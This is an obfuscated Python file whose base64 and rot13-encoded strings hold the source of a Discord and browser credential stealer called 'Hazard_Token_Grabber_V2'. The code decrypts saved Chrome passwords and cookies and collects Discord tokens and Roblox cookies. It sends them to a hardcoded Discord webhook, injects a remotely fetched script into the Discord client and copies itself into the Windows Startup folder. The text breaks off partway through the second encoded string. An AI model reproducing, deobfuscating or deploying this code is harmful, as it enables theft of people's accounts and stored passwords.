import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCBodHRweAppbXBvcnQgY3R5cGVzCmltcG9ydCBzaHV0aWwKaW1wb3J0IHBzdXRpbAppbXBvcnQgYXN5bmNpbwppbXBvcnQgc3FsaXRlMwppbXBvcnQgemlwZmlsZQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBzdWJwcm9jZXNzCgpmcm9tIHN5cyBpbXBvcnQgYXJndgpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSByZSBpbXBvcnQgZmluZGFsbCwgbWF0Y2gKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKZnJvbSB3aW4zMmNyeXB0IGltcG9ydCBDcnlwdFVucHJvdGVjdERhdGEKCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKCmNvbmZpZyA9IHsKICAgICMgcmVwbGFjZSBXRUJIT09LX0hFUkUgd2l0aCB5b3VyIHdlYmhvb2sKICAgICd3ZWJob29rJzogImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk2NDYzNzYzODU4ODAwNjQ0MC9JOS1DUTRQOXhROTl4c04tRnpYSzBwd19wQU43c05vT2Jac2FyS2dmS0s0YmV3TG03QUJQTnpKT3JWVHNfTEsyVGFjUSIsCiAgICAjIGtlZXAgaXQgYXMgaXQgaXMgdW5sZXNzIHlvdSB3YW50IHRvIGhhdmUgYSBjdXN0b20gb25lCiAgICAnaW5qZWN0aW9uX3VybCc6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUmRpbW8vRGlzY29yZC1JbmplY3Rpb24vbWFzdGVyL2luamVjdGlvbi5qcyIsCiAgICAjIHNldCB0byBGYWxzZSBpZiB5b3UgZG9uJ3Qgd2FudCBpdCB0byBraWxsIERpc2NvcmQgdXBvbiBydW5uaW5nIGV4ZQogICAgJ2tpbGxfZGlzY29yZCc6IEZhbHNlLAogICAgIyBpZiB5b3Ugd2FudCB0aGUgZmlsZSB0byBydW4gYXQgc3RhcnR1cAogICAgJ3N0YXJ0dXAnOiBUcnVlLAogICAgIyBpZiB5b3Ugd2FudCB0aGUgZmlsZSB0byBoaWRlIGl0c2VsZiBhZnRlciBydW4KICAgICdoaWRlX3NlbGYnOiBGYWxzZQp9CgoKY2xhc3MgZnVuY3Rpb25zKG9iamVjdCk6CiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZ2V0SGVhZGVycyh0b2tlbjogc3RyID0gTm9uZSk6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICB9CiAgICAgICAgaWYgdG9rZW46CiAgICAgICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkKICAgICAgICByZXR1cm4gaGVhZGVycwoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBnZXRfbWFzdGVyX2tleShwYXRoKSAtPiBzdHI6CiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgYyA9IGYucmVhZCgpCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpCgogICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gbWFzdGVyX2tleVs1Ol0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZGVjcnlwdF92YWwoYnVmZiwgbWFzdGVyX2tleSkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuICJGYWlsZWQgdG8gZGVjcnlwdCBwYXNzd29yZCIKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgY29uZmlnKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBjb25maWcuZ2V0KGUpCgoKY2xhc3MgSGF6YXJkX1Rva2VuX0dyYWJiZXJfVjIoZnVuY3Rpb25zKToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLndlYmhvb2sgPSBzZWxmLmNvbmZpZygnd2ViaG9vaycpCiAgICAgICAgc2VsZi5iYXNldXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKICAgICAgICBzZWxmLmFwcGRhdGEgPSBvcy5nZXRlbnYoImxvY2FsYXBwZGF0YSIpCiAgICAgICAgc2VsZi5yb2FtaW5nID0gb3MuZ2V0ZW52KCJhcHBkYXRhIikKICAgICAgICBzZWxmLnRlbXAgPSBvcy5nZXRlbnYoInRlbXAiKQogICAgICAgIHNlbGYuc3RhcnR1cCA9IHNlbGYucm9hbWluZyArICJcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXCIKICAgICAgICBzZWxmLmRpciA9IHNlbGYudGVtcCsiXFxIYXphcmRfVG9rZW5fR3JhYmJlcl9WMiIKICAgICAgICBzZWxmLnJlZ2V4ID0gciJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9IgogICAgICAgIHNlbGYuZW5jcnlwdGVkX3JlZ2V4ID0gciJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiCgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKHNlbGYuZGlyKSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgICAgIHNlbGYuc2VwID0gb3Muc2VwCiAgICAgICAgc2VsZi50b2tlbnMgPSBbXQogICAgICAgIHNlbGYucm9ibG94Y29va2llcyA9IFtdCgogICAgZGVmIHRyeV9leHRyYWN0KGZ1bmMpOgogICAgICAgIGRlZiB3cmFwcGVyKCphcmdzLCAqKmt3YXJncyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybiB3cmFwcGVyCgogICAgYXN5bmMgZGVmIGNoZWNrVG9rZW4oc2VsZiwgdGtuOiBzdHIpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHIgPSBodHRweC5nZXQoCiAgICAgICAgICAgICAgICB1cmw9c2VsZi5iYXNldXJsLAogICAgICAgICAgICAgICAgaGVhZGVycz1zZWxmLmdldEhlYWRlcnModGtuKSwKICAgICAgICAgICAgICAgIHRpbWVvdXQ9NS4wCiAgICAgICAgICAgICkKICAgICAgICBleGNlcHQgKGh0dHB4Ll9leGNlcHRpb25zLkNvbm5lY3RUaW1lb3V0LCBodHRweC5fZXhjZXB0aW9ucy5UaW1lb3V0RXhjZXB0aW9uKToKICAgICAgICAgICAgcGFzcwogICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIGFuZCB0a24gbm90IGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodGtuKQoKICAgIGFzeW5jIGRlZiBpbml0KHNlbGYpOgogICAgICAgIGF3YWl0IHNlbGYuYnlwYXNzQmV0dGVyRGlzY29yZCgpCiAgICAgICAgYXdhaXQgc2VsZi5ieXBhc3NUb2tlblByb3RlY3RvcigpCiAgICAgICAgZnVuY3Rpb25fbGlzdCA9IFtzZWxmLnNjcmVlbnNob3QsIHNlbGYuZ3JhYlRva2VucywKICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZ3JhYlJvYmxveENvb2tpZV0KICAgICAgICBpZiBzZWxmLmNvbmZpZygnaGlkZV9zZWxmJyk6CiAgICAgICAgICAgIGZ1bmN0aW9uX2xpc3QuYXBwZW5kKHNlbGYuaGlkZSkKCiAgICAgICAgaWYgc2VsZi5jb25maWcoJ2tpbGxfZGlzY29yZCcpOgogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmFwcGVuZChzZWxmLmtpbGxEaXNjb3JkKQoKICAgICAgICBpZiBzZWxmLmNvbmZpZygnc3RhcnR1cCcpOgogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmFwcGVuZChzZWxmLnN0YXJ0dXApCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0JykgYW5kIG9zLnBhdGguZXhpc3RzKHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZScpOgogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmFwcGVuZChzZWxmLmdyYWJQYXNzd29yZCkKICAgICAgICAgICAgZnVuY3Rpb25fbGlzdC5hcHBlbmQoc2VsZi5ncmFiQ29va2llcykKCiAgICAgICAgZm9yIGZ1bmMgaW4gZnVuY3Rpb25fbGlzdDoKICAgICAgICAgICAgcHJvY2VzcyA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWZ1bmMsIGRhZW1vbj1UcnVlKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiB0aHJlYWRpbmcuZW51bWVyYXRlKCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHQuam9pbigpCiAgICAgICAgICAgIGV4Y2VwdCBSdW50aW1lRXJyb3I6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIHNlbGYubmVhdGlmeVRva2VucygpCiAgICAgICAgYXdhaXQgc2VsZi5pbmplY3RvcigpCiAgICAgICAgc2VsZi5maW5pc2goKQogICAgICAgIHNodXRpbC5ybXRyZWUoc2VsZi5kaXIpCgogICAgZGVmIGhpZGUoc2VsZik6CiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRGaWxlQXR0cmlidXRlc1coYXJndlswXSwgMikKCiAgICBkZWYgc3RhcnR1cChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNodXRpbC5jb3B5Mihhcmd2WzBdLCBzZWxmLnN0YXJ0dXApCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIGFzeW5jIGRlZiBpbmplY3RvcihzZWxmKToKICAgICAgICBmb3IgX2RpciBpbiBvcy5saXN0ZGlyKHNlbGYuYXBwZGF0YSk6CiAgICAgICAgICAgIGlmICdkaXNjb3JkJyBpbiBfZGlyLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBkaXNjb3JkID0gc2VsZi5hcHBkYXRhK3NlbGYuc2VwK19kaXIKICAgICAgICAgICAgICAgIGRpc2Nfc2VwID0gZGlzY29yZCtzZWxmLnNlcAogICAgICAgICAgICAgICAgZm9yIF9fZGlyIGluIG9zLmxpc3RkaXIob3MucGF0aC5hYnNwYXRoKGRpc2NvcmQpKToKICAgICAgICAgICAgICAgICAgICBpZiBtYXRjaChyJ2FwcC0oXGQqXC5cZCopKicsIF9fZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgYXBwID0gb3MucGF0aC5hYnNwYXRoKGRpc2Nfc2VwK19fZGlyKQogICAgICAgICAgICAgICAgICAgICAgICBpbmpfcGF0aCA9IGFwcCsnXFxtb2R1bGVzXFxkaXNjb3JkX2Rlc2t0b3BfY29yZS0yXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcJwogICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhpbmpfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLnN0YXJ0dXAgbm90IGluIGFyZ3ZbMF06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhpbmpfcGF0aCsnaW5pdGlhdGlvbicsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChGaWxlRXhpc3RzRXJyb3IsIFBlcm1pc3Npb25FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgPSBodHRweC5nZXQoc2VsZi5jb25maWcoJ2luamVjdGlvbl91cmwnKSkudGV4dC5yZXBsYWNlKCIlV0VCSE9PSyUiLCBzZWxmLndlYmhvb2spCiAgICAgICAgICAgICAgICAgICAgICAgI'
love = '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SkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljXVPNtVPNtVPNtVPNtW0Abpz9gMFOGrSZaBvOmMJkzYzSjpTEuqTRtXlOlW1kpE29iM2kyKSkQnUWioJHtH3uGKSkIp2IlVREuqTSpKRkiL2SfVSA0o3WuM2IpKTkyqzIfMTWpKPpfPvNtVPNtVPNtVPNtVPqQnUWioJHaBvOmMJkzYzSjpTEuqTRtXlOlW1kpE29iM2kyKSkQnUWioJIpKSImMKVtETS0LIkpETIzLKIfqSkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljXVPNtVPNtVPNtVPNtW0IjnJZtHUWcqzSwrFOPpz93p2IlWmbtp2IfMv5upUOxLKEuVPftpvqpKRIjnJZtHUWcqzSwrFOPpz93p2IlKSkIp2IlVREuqTSpKRkiL2SfVSA0o3WuM2IpKTkyqzIfMTWpKPpfPvNtVPNtVPNtVPNtVPqAnJAlo3AiMaDtEJEaMFp6VUAyoTLhLKOjMTS0LFNeVUVaKSkAnJAlo3AiMaEpKRIxM2IpKSImMKVtETS0LIkpETIzLKIfKSkZo2AuoPOGqT9lLJqyKSkfMKMyoTEvKSjaYNbtVPNtVPNtVPNtVPNaIKWuovp6VUAyoTLhLKOjMTS0LFNeVUVaKSk1D296GJIxnJSpKSIlLJ5pKSImMKVtETS0LIkpETIzLKIfqSkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljXVPNtVPNtVPNtVPNtW1yuozEyrPp6VUAyoTLhLKOjMTS0LFNeVUVaKSkMLJ5xMKupKSyuozEyrRWlo3qmMKWpKSImMKVtETS0LIkpETIzLKIfqSkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljXVPNtVPNtVPNtVPNtW0WlLKMyWmbtp2IfMv5upUOxLKEuVPftpvqpKRWlLKMyH29zqUqupzIpKRWlLKMyYHWlo3qmMKWpKSImMKVtETS0LIkpETIzLKIfqSkpGT9wLJjtH3EipzSaMIkpoTI2MJkxLykpWljXVPNtVPNtVPNtVPNtW0ylnJEcqJ0aBvOmMJkzYzSjpTEuqTRtXlOlW1kpFKWcMTy1oIkpIKAypvORLKEuKSkRMJMuqJk0KSkZo2AuoPOGqT9lLJqyKSkfMKMyoTEvKSjaPvNtVPNtVPNtsDbXVPNtVPNtVPOzo3VtKljtpTS0nPOcovOjLKEbpl5cqTIgpltcBtbtVPNtVPNtVPNtVPOcMvOho3Dto3ZhpTS0nP5yrTymqUZbpTS0nPx6PvNtVPNtVPNtVPNtVPNtVPOwo250nJ51MDbtVPNtVPNtVPNtVPOcMvNvMTymL29lMPVtoz90VTyhVUOuqTt6PvNtVPNtVPNtVPNtVPNtVPOzo3VtMzyfMI9hLJ1yVTyhVT9mYzkcp3ExnKVbpTS0nPx6PvNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtoz90VTMcoTIsozSgMF5yozEmq2y0nPtaYzkiMlpcVTShMPOho3DtMzyfMI9hLJ1yYzIhMUA3nKEbXPphoTEvWlx6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTAioaEcoaIyPvNtVPNtVPNtVPNtVPNtVPNtVPNtMz9lVTkcozHtnJ4tJ3thp3ElnKNbXFOzo3VtrPOcovOipTIhXTLar3OuqTu9KSk7MzyfMI9hLJ1ysFpfVTIlpz9lpm0anJqho3WyWlxhpzIuMT'
